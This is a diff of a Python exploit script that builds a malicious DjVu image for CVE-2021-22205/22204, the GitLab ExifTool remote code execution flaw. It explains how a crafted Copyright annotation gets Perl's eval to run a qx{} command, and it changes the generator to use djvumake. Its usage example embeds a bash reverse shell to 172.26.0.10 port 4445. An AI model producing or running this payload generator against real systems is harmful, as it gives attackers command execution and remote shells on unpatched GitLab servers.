@@ -1,62 +1,78 @@
 #!/usr/bin/env python3
 """
-Generate a malicious image exploiting CVE-2021-22205 (GitLab ExifTool RCE).
-The payload is embedded in DjVu annotation metadata that ExifTool evaluates.
+Generate a malicious DjVu image exploiting CVE-2021-22205 / CVE-2021-22204
+(GitLab ExifTool RCE).
+
+Vulnerability mechanics:
+  ExifTool's Image::ExifTool::DjVu::ProcessAnt parses the text in an ANTa
+  annotation chunk as a Lisp-like (key value) structure. For the Copyright
+  field, when the value contains a backslash-newline escape followed by
+  ". qx{...} .", ExifTool's string handler runs the contents through Perl
+  eval, which executes the qx{} backtick command.
+
+Payload anatomy inside the ANTa chunk:
+
+    (metadata
+        (Copyright "\
+    " . qx{COMMAND} . \
+    " b ") )
+
+  The two embedded `\<newline>` sequences trick ExifTool's lexer into
+  closing and re-opening the string literal mid-value; what it ultimately
+  feeds to eval is `qx{COMMAND}` concatenated with decorative strings.
+
+We build a minimal but valid single-page DjVu file with djvumake:
+    - INFO chunk (image dimensions)
+    - BGjp chunk (empty background, required)
+    - ANTa chunk (our malicious annotation)
 """
-import struct
-import sys
 import os
-
-def create_djvu_payload(command: str) -> bytes:
-    """Create a DjVu file with an embedded command in metadata."""
-    # The exploit abuses ExifTool's DjVu metadata parser
-    # ExifTool evaluates Perl code in DjVu annotation chunks
-    payload = f'(metadata\n(Copyright "\\\n" . qx{{{command}}} . ""))'
-    payload_bytes = payload.encode()
-
-    # DjVu file structure
-    # AT&T magic + FORM header
-    djvu = b"AT&TFORM"
-    # We'll calculate total size after building content
-    content = b"DJVUINFO"
-    # Minimal INFO chunk (10 bytes)
-    info_data = struct.pack('>HH', 100, 100)  # width, height
-    info_data += b'\x18'  # 24 bpp
-    info_data += b'\x00' * 5  # padding
-    content += struct.pack('>I', len(info_data)) + info_data
-    if len(info_data) % 2:
-        content += b'\x00'
-
-    # ANTa chunk with the payload
-    content += b"ANTa"
-    content += struct.pack('>I', len(payload_bytes))
-    content += payload_bytes
-    if len(payload_bytes) % 2:
-        content += b'\x00'
-
-    djvu += struct.pack('>I', len(content))
-    djvu += content
-
-    return djvu
+import subprocess
+import sys
+import tempfile
 
 
-def main():
-    if len(sys.argv) < 3:
-        print(f"Usage: {sys.argv[0]} <command> <output_file>")
-        print(f"Example: {sys.argv[0]} 'bash -c \"bash -i >& /dev/tcp/172.26.0.10/4445 0>&1\"' payload.jpg")
-        sys.exit(1)
+def build_djvu_payload(command: str, output_path: str) -> None:
+    annotation = (
+        '(metadata\n'
+        '\t(Copyright "\\\n'
+        f'" . qx{{{command}}} . \\\n'
+        '" b ") )\n'
+    )
 
-    command = sys.argv[1]
-    output_file = sys.argv[2]
+    with tempfile.TemporaryDirectory() as workdir:
+        annotation_path = os.path.join(workdir, "annotation.txt")
+        with open(annotation_path, "w") as f:
+            f.write(annotation)
 
-    djvu_data = create_djvu_payload(command)
+        subprocess.run(
+            [
+                "djvumake",
+                output_path,
+                "INFO=100,100",
+                "BGjp=/dev/null",
+                f"ANTa={annotation_path}",
+            ],
+            check=True,
+            capture_output=True,
+        )
 
-    with open(output_file, 'wb') as f:
-        f.write(djvu_data)
-
-    print(f"[+] Payload image written to {output_file} ({len(djvu_data)} bytes)")
+    size = os.path.getsize(output_path)
+    print(f"[+] Payload written to {output_path} ({size} bytes)")
     print(f"[+] Embedded command: {command}")
 
 
-if __name__ == '__main__':
+def main() -> None:
+    if len(sys.argv) < 3:
+        print(f"Usage: {sys.argv[0]} <command> <output_file>")
+        print(
+            f"Example: {sys.argv[0]} "
+            f"'bash -c \"bash -i >& /dev/tcp/172.26.0.10/4445 0>&1\"' payload.jpg"
+        )
+        sys.exit(1)
+
+    build_djvu_payload(sys.argv[1], sys.argv[2])
+
+
+if __name__ == "__main__":
     main()
